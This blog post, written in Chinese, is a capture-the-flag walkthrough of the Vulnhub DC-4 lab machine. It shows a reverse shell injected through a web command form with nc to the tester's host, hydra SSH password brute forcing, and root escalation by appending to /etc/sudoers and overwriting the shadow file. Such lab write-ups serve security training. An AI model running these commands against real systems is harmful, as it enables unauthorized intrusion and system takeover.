---
title: Vulnhub-DC-4
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-4

> https://www.vulnhub.com/entry/dc-4,313/
> 

## 主机发现端口扫描

1. 探测存活主机，`173`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24                      
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 15:33 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00017s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.173
    Host is up (0.00054s latency).
    MAC Address: 00:0C:29:01:61:57 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00022s latency).
    MAC Address: 00:50:56:E0:C9:6A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 扫描靶机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.173
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 15:34 CST
    Nmap scan report for 192.168.75.173
    Host is up (0.0011s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:01:61:57 (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sV -sT -O -p80,22 192.168.75.173 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 15:36 CST
    Nmap scan report for 192.168.75.173
    Host is up (0.0010s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    80/tcp open  http    nginx 1.15.10
    MAC Address: 00:0C:29:01:61:57 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22 192.168.75.173 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 15:37 CST
    Nmap scan report for 192.168.75.173
    Host is up (0.00030s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.173
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.173:80/
    |     Form id: 
    |     Form action: login.php
    |     
    |     Path: http://192.168.75.173:80/login.php
    |     Form id: 
    |_    Form action: login.php
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    MAC Address: 00:0C:29:01:61:57 (VMware)
    ```
    

## web渗透

1. 访问页面，显示**`Admin Information Systems Login`**
    
    ![image.png](image%2027.png)
    
2. 扫描目录，也没发现
    
    ```python
    dirsearch -u 192.168.75.173 -x 403
    //
    [15:40:32] Starting:
    [15:40:53] 302 -  704B  - /command.php  ->  index.php
    [15:40:55] 301 -  170B  - /css  ->  http://192.168.75.173/css/
    [15:41:02] 301 -  170B  - /images  ->  http://192.168.75.173/images/
    [15:41:06] 302 -  206B  - /login.php  ->  index.php
    [15:41:07] 302 -  163B  - /logout.php  ->  index.php
    
    ```
    
3. 尝试了`sql`注入也没效果，尝试暴力破解
4. 用户名是`admin`，爆破密码
    
    ![image.png](image%2028.png)
    
    `happy`的时候长度明显不一样，密码应该就是`happy`了
    
5. 成功登陆进去，点击`run`会执行查看当前目录文件，执行的命令是`ls -l`
    
    ![image.png](image%2029.png)
    
6. 当我们不知道命令是怎么控制的，抓包看看
    
    ```python
    POST /command.php HTTP/1.1
    Host: 192.168.75.173
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 22
    Origin: http://192.168.75.173
    Sec-GPC: 1
    Connection: keep-alive
    Referer: http://192.168.75.173/command.php
    Cookie: PHPSESSID=18ugmlkd6apve37kqclfdj4100
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    radio=ls+-l&submit=Run
    ```
    
    原来是在数据包参数`radio`规定执行的命令，我们直接输入反弹`shell`命令，kali同时开启监听
    
    ```python
    radio=nc 192.168.75.151 1234 -e /bin/bash&submit=Run
    ```
    
    获得shell
    
    ```python
    listening on [any] 1234 ...
    192.168.75.173: inverse host lookup failed: Unknown host
    connect to [192.168.75.151] from (UNKNOWN) [192.168.75.173] 45602
    ```
    

## 提权

1. 查看权限
    
    ```python
    www-data@dc-4:/usr/share/nginx/html$ whoami
    www-data
    //
    www-data@dc-4:/usr/share/nginx/html$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    //
    www-data@dc-4:/usr/share/nginx/html$ uname -a
    Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 GNU/Linux
    ```
    
2. 查找敏感文件
    
    ```python
    www-data@dc-4:/usr/share/nginx/html$ find / -perm -u=s -type f 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    /usr/bin/gpasswd
    /usr/bin/chfn
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/sbin/exim4
    /bin/mount
    /bin/umount
    /bin/su
    /bin/ping
    /home/jim/test.sh
    ```
    
    发现一个存在可执行文件`test.sh`
    
3. 查看`test.sh`内容，应该提示该目录下有东西什么的
    
    ```python
    www-data@dc-4:/home/jim$ cat test.sh
    //
    #!/bin/bash
    for i in {1..5}
    do
     sleep 1
     echo "Learn bash they said."
     sleep 1
     echo "Bash is good they said."
    done
     echo "But I'd rather bash my head against a brick wall."
    ```
    
4. 进行查看`jim`目录下的文件，目录下的`mbox`文件没访问权限，在`backups`目录下找到`old-passwords.bak` 
    
    ```python
    www-data@dc-4:/home/jim/backups$ cat old-passwords.bak
    cat old-passwords.bak
    000000
    12345
    iloveyou
    1q2w3e4r5t
    1234
    123456a
    
    ...........
    
    svetlana
    fatima
    123456k
    icecream
    popcorn1
    ```
    
    是很多的的密码，我们拿去爆破`ssh`用户`jim` ，将内容保存为`passwd`
    
5. 使用hydra爆破
    
    ```python
     hydra -l jim -P passwd -vV -e ns 192.168.75.173 ssh
    ```
    
    ```python
    [22][ssh] host: 192.168.75.173   login: jim   password: jibril04
    [STATUS] attack finished for 192.168.75.173 (waiting for children to complete tests)
    1 of 1 target successfully completed, 1 valid password found
    ```
    
    破解出用户`jim`密码`jibril04` ，其实也可以用来尝试破解`root`用户，不过没破解出来
    
6. 登录`jim`用户,查看权限
    - 没有相关`sudo`权限
    - 查看当前目录下的`mbox`文件
        
        ```python
        From root@dc-4 Sat Apr 06 20:20:04 2019
        Return-path: <root@dc-4>
        Envelope-to: jim@dc-4
        Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
        Received: from root by dc-4 with local (Exim 4.89)
                (envelope-from <root@dc-4>)
                id 1hCiQe-0000gc-EC
                for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
        To: jim@dc-4
        Subject: Test
        MIME-Version: 1.0
        Content-Type: text/plain; charset="UTF-8"
        Content-Transfer-Encoding: 8bit
        Message-Id: <E1hCiQe-0000gc-EC@dc-4>
        From: root <root@dc-4>
        Date: Sat, 06 Apr 2019 20:20:04 +1000
        Status: RO
        
        This is a test.
        ```
        
        是一封来自`root`的文件，跟着邮件这个线索，我们去翻邮件`/var/mail` 存在一封`jim`的邮件
        
        ```python
        From charles@dc-4 Sat Apr 06 21:15:46 2019
        Return-path: <charles@dc-4>
        Envelope-to: jim@dc-4
        Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
        Received: from charles by dc-4 with local (Exim 4.89)
                (envelope-from <charles@dc-4>)
                id 1hCjIX-0000kO-Qt
                for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
        To: jim@dc-4
        Subject: Holidays
        MIME-Version: 1.0
        Content-Type: text/plain; charset="UTF-8"
        Content-Transfer-Encoding: 8bit
        Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
        From: Charles <charles@dc-4>
        Date: Sat, 06 Apr 2019 21:15:45 +1000
        Status: O
        
        Hi Jim,
        
        I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
        
        Password is:  ^xHhA&hvim0y
        
        See ya,
        Charles
        ```
        
        告诉我们`Charles`的密码是`^xHhA&hvim0y`
        
7. 登录`charles`用户，查看权限
    
    ```python
    charles@dc-4:~$ sudo -l
    Matching Defaults entries for charles on dc-4:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User charles may run the following commands on dc-4:
        (root) NOPASSWD: /usr/bin/teehee
    ```
    
    存在有sudo权限的`teehee` 命令
    
    ```python
    charles@dc-4:/usr/bin$ sudo teehee --help
    Usage: teehee [OPTION]... [FILE]...
    Copy standard input to each FILE, and also to standard output.
    
      -a, --append              append to the given FILEs, do not overwrite
      -i, --ignore-interrupts   ignore interrupt signals
      -p                        diagnose errors writing to non pipes
          --output-error[=MODE]   set behavior on write error.  See MODE below
          --help     display this help and exit
          --version  output version information and exit
    
    MODE determines behavior with write errors on the outputs:
      'warn'         diagnose errors writing to any output
      'warn-nopipe'  diagnose errors writing to any output not a pipe
      'exit'         exit on error writing to any output
      'exit-nopipe'  exit on error writing to any output not a pipe
    The default MODE for the -p option is 'warn-nopipe'.
    The default operation when --output-error is not specified, is to
    exit immediately on error writing to a pipe, and diagnose errors
    writing to non pipe outputs.
    
    GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
    Full documentation at: <http://www.gnu.org/software/coreutils/tee>
    or available locally via: info '(coreutils) tee invocation'
    ```
    
8. `teehee`提权，直接给用户`sudo all nopasswd`权限
    
    ```python
    echo "charles ALL=(ALL) NOPASSWD: ALL" | sudo teehee -a /etc/sudoers
    ```
    
    然后修改`shadow`文件
    
    ```python
    sudo nano /etc/shadow
    ```
    
    将当前用户`charles`的密码覆盖`root`账户的密码
    
    ```python
    
    root:$6$C7nromw2$HB4uMhUmb.srv.I.Q00bT/SV3fxgphbarSb4A8B0aI6kPGOy6WKrKJk.ckCfMLuO6H4uqGx68ylJcmB5ezJ.r0:17992:0:99999:7:::
    .......
    charles:$6$C7nromw2$HB4uMhUmb.srv.I.Q00bT/SV3fxgphbarSb4A8B0aI6kPGOy6WKrKJk.ckCfMLuO6H4uqGx68ylJcmB5ezJ.r0:17992:0:99999:7:::
    ```
    
    `su`切换到`root` ，使用`charles`的密码`^xHhA&hvim0y`
    
    ```python
    charles@dc-4:~$ su root
    Password: 
    root@dc-4:/home/charles# 
    ```
    
    提权成功！读取`flag`文件
    
    ```python
    # root@dc-4:~# cat flag.txt
    
    888       888          888 888      8888888b.                             888 888 888 888 
    888   o   888          888 888      888  "Y88b                            888 888 888 888 
    888  d8b  888          888 888      888    888                            888 888 888 888 
    888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
    888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
    88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
    8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
    888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 
    
    Congratulations!!!
    
    Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
    who have provided feedback, and who have taken time to complete these little
    challenges.
    
    If you enjoyed this CTF, send me a tweet via @DCAU7.
    ```